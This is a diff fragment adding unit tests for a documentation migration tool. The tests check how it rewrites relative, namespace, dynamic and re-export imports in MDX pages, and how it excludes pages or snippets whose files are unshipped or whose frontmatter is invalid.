+      }
+    })
+
+    it('rewrites a namespace import and a dynamic import of a shipped file to the migrated path', () => {
+      const ns = keptPage("import * as X from './comp.jsx'\n\n<X.Named />")
+      expect(ns.page?.body).toMatch(/import \* as X from "@\/mdx\/migrated\//)
+      expect(ns.page?.body).not.toContain('./comp.jsx')
+      for (const body of [
+        "export const load = () => import('./lib/m')\n\nText.",
+        "{import('./comp.jsx')}\n\nText.",
+        "<Card title={String(import('./lib/m'))}>Text.</Card>",
+      ]) {
+        const { page, warnings } = keptPage(body)
+        expect(page?.body).toMatch(/import\("@\/mdx\/migrated\//)
+        expect(page?.body).not.toMatch(/import\('\.\//)
+        expect(warnings.some((warning) => warning.code === 'skipped-file')).toBe(false)
+      }
+    })
+
+    it('rewrites a re-export from a shipped file to the migrated path and keeps the page', () => {
+      for (const body of [
+        "export { Named } from './comp.jsx'\n\nText.",
+        "export * from './lib/m'\n\nText.",
+        "export { default as Comp } from './comp.jsx'\n\nText.",
+      ]) {
+        const { page, warnings } = keptPage(body)
+        expect(page?.body).toMatch(/export (\{[^}]*\}|\*) from "@\/mdx\/migrated\//)
+        expect(page?.body).not.toMatch(/from '\.\//)
+        expect(warnings.some((warning) => warning.code === 'skipped-file')).toBe(false)
+      }
+    })
+
+    it('excludes a page that re-exports from a file that is not shipped', () => {
+      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-relative-reexport-'))
+      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home', 'other'] } }))
+      writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nexport { metadata } from './metadata'\n\nText.\n")
+      writeFileSync(join(root, 'other.mdx'), '---\ntitle: Other\n---\n\nHi\n')
+      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+      expect(bundle.pages.map((page) => page.id)).toEqual(['other'])
+    })
+
+    it('excludes a namespace import of a file that is not shipped with a single warning', () => {
+      const root = mkdtempSync(join(tmpdir(), 'thally-migrate-relative-ns-'))
+      writeFileSync(join(root, 'docs.json'), JSON.stringify({ $schema: 'https://mintlify.com/docs.json', navigation: { pages: ['home', 'other'] } }))
+      writeFileSync(join(root, 'home.mdx'), "---\ntitle: Home\n---\n\nimport * as M from './metadata'\n\nText.\n")
+      writeFileSync(join(root, 'other.mdx'), '---\ntitle: Other\n---\n\nHi\n')
+      const bundle = migrateRepository({ repositoryDir: root, sourceUrl: 'https://github.com/acme/docs' })
+      expect(bundle.pages.map((page) => page.id)).toEqual(['other'])
+      const messages = bundle.warnings.filter((warning) => warning.source === 'home.mdx').map((warning) => warning.message)
+      expect(messages.some((message) => /Page was excluded/.test(message))).toBe(true)
+      expect(messages.some((message) => /was preserved/.test(message))).toBe(false)
+    })
+  })
+
+  it('does not inline a snippet whose frontmatter is invalid YAML, by import, value import, file tag or global alias', () => {
+    const bad = '---\ntitle: [unclosed\n---\nexport const KEY = "leaked-value";\n\n<b>leaked-component</b>\n'
+    const files = { 'snippets/my-box.mdx': bad }
+    for (const body of [
+      "import MyBox from '/snippets/my-box.mdx';\n\n<MyBox />",
+      "import { KEY } from '/snippets/my-box.mdx';\n\nV {KEY}",
+      '<Snippet file="my-box.mdx" />',
+      '<MyBox />',
+    ]) {
+      const { page, warnings } = snippetFixture(files, body)
+      expect(page?.body ?? '').not.toContain('leaked')
+      expect(warnings.some((warning) => warning.message.includes('frontmatter that could not be read') && warning.source === 'home.mdx')).toBe(true)
+    }
+  })
+})
+
